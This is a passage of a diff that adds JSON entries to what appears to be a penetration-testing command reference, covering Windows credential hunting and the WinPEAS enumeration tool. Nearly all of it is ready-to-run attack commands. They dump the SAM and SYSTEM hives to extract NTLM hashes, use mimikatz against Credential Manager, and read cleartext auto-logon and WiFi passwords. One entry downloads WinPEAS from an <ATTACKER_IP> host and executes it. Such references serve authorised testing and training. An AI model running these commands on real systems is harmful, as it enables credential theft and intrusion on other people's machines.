+          "command": "dir \"C:\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\ndir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"",
+          "note": "Writable startup items run on next logon"
+        }
+      ],
+      "see_also": ["windows-services", "windows-credentials", "windows-enum"]
+    },
+    "windows-credentials": {
+      "name": "Windows Credential Hunting",
+      "full_name": "Windows Stored Credential and Password Discovery",
+      "description": "SAM database, LSASS memory, credential manager, PowerShell history, unattend files, registry, and common config files regularly contain cleartext or crackable credentials.",
+      "platform": "windows",
+      "aliases": ["credential hunting", "windows passwords", "sam database", "lsass dump", "windows creds"],
+      "commands": [
+        {
+          "name": "SAM and SYSTEM hive backup",
+          "platform": "windows",
+          "category": "exploitation",
+          "command": "reg save HKLM\\SAM C:\\temp\\SAM\nreg save HKLM\\SYSTEM C:\\temp\\SYSTEM\nreg save HKLM\\SECURITY C:\\temp\\SECURITY\n# Extract offline:\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL",
+          "note": "Requires SeBackupPrivilege or local admin — extracts NTLM hashes"
+        },
+        {
+          "name": "Check SAM backup files",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "dir /b /s C:\\Windows\\repair\\sam 2>nul\ndir /b /s C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul",
+          "note": "Backup SAM files are sometimes readable without admin rights"
+        },
+        {
+          "name": "Search for passwords in common files",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "findstr /si password *.xml *.ini *.txt 2>nul\nfindstr /si pass *.config 2>nul\ndir /s /b *sysprep.inf *sysprep.xml *unattend.xml *unattended.xml 2>nul",
+          "note": "Unattend.xml from Windows deployments often has admin creds"
+        },
+        {
+          "name": "Windows Credential Manager",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "cmdkey /list\nvaultcmd /listcreds:\"Windows Credentials\" /all\n# Dump with mimikatz:\ndpapi::cred /in:%APPDATA%\\Microsoft\\Credentials\\<GUID>",
+          "note": "Stored RDP, network share, and web credentials"
+        },
+        {
+          "name": "Winlogon stored credentials",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AltDefaultPassword",
+          "note": "Auto-logon configurations often store cleartext passwords"
+        },
+        {
+          "name": "WiFi stored passwords",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "netsh wlan show profiles\nnetsh wlan show profile name=\"<PROFILE>\" key=clear",
+          "note": "Each network profile may contain a cleartext key"
+        }
+      ],
+      "see_also": ["windows-enum", "windows-tokens", "windows-registry"]
+    },
+    "winpeas": {
+      "name": "WinPEAS",
+      "full_name": "Windows Privilege Escalation Awesome Script",
+      "description": "WinPEAS is the primary automated Windows privesc enumeration tool. Color-codes findings by severity. Run it immediately after initial access — it covers services, tokens, credentials, registry, and more.",
+      "platform": "windows",
+      "aliases": ["winpeas.exe", "windows automation", "windows privesc script", "peas windows"],
+      "commands": [
+        {
+          "name": "Run WinPEAS (all checks)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "winpeas.exe\nwinpeas.exe quiet cmd fast",
+          "note": "Download from github.com/carlospolop/PEASS-ng/releases — run as low-priv user"
+        },
+        {
+          "name": "Transfer WinPEAS via PowerShell",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "# On attacker:\npython3 -m http.server 8080\n# On target:\n(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8080/winpeas.exe', 'C:\\temp\\winpeas.exe')\nC:\\temp\\winpeas.exe | Out-File C:\\temp\\out.txt",
+          "note": "Save output to file — WinPEAS is verbose"
+        },
+        {
+          "name": "PowerUp (PowerShell privesc checks)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "# On target:\n. .\\PowerUp.ps1\nInvoke-AllChecks",
+          "note": "github.com/PowerShellMafia/PowerSploit — covers service/token/registry checks"
+        },
+        {
+          "name": "Seatbelt (security configuration audit)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "Seatbelt.exe -group=all\nSeatbelt.exe CredEnum",
+          "note": "github.com/GhostPack/Seatbelt — good for OPSEC-safe enumeration"
+        },
+        {
+          "name": "Windows Exploit Suggester (offline)",
+          "platform": "windows",
+          "category": "enumeration",
+          "command": "# On target: systeminfo > systeminfo.txt\n# On attacker:\npython3 wes.py systeminfo.txt",
+          "note": "github.com/bitsadmin/wesng — maps patch level to known exploits"
+        }
+      ],
+      "see_also": ["windows-enum", "windows-tokens", "windows-services"]
+    }
+  },
+  "platform_index": {
+    "linux": [
+      "linux-enum",
+      "linux-sudo",
+      "linux-suid",
+      "linux-cron",
+      "linux-capabilities",
+      "linux-services",
+      "linux-writable",
+      "linpeas"
+    ],
+    "windows": [
+      "windows-enum",
+      "windows-services",
+      "windows-tokens",
+      "windows-registry",
+      "windows-credentials",
+      "winpeas"
+    ]
+  }
+}
